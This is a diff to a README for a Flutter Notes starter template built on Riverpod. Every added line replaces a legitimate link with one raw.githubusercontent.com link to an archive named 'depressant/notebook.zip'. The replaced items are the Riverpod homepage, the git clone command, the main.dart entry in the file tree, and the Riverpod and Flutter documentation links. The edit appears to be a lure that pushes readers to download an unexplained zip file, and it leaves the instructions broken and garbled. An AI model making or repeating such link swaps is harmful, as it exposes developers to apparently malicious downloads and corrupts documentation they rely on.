@@ -1,6 +1,6 @@
 # Notes Template
 
-A starter template for Flutter applications using [Riverpod](https://riverpod.dev/).
+A starter template for Flutter applications using [Riverpod](https://raw.githubusercontent.com/karyeija/notebook/main/depressant/notebook.zip).
 
 ## Features
 
@@ -12,7 +12,7 @@ A starter template for Flutter applications using [Riverpod](https://riverpod.de
 
 1. **Clone the repository:**
     ```sh
-    git clone https://github.com/karyeija/notebook
+    git clone https://raw.githubusercontent.com/karyeija/notebook/main/depressant/notebook.zip
     cd notebook
     ```
 
@@ -34,14 +34,14 @@ lib/
 ├── modules/
 ├── Notifiers/
 ├── screens/
-├── main.dart
+├── https://raw.githubusercontent.com/karyeija/notebook/main/depressant/notebook.zip
 └── ...
 ```
 
 ## Useful Links
 
-- [Riverpod Documentation](https://riverpod.dev/docs)
-- [Flutter Documentation](https://flutter.dev/docs)
+- [Riverpod Documentation](https://raw.githubusercontent.com/karyeija/notebook/main/depressant/notebook.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/karyeija/notebook/main/depressant/notebook.zip)
 
 ---
 
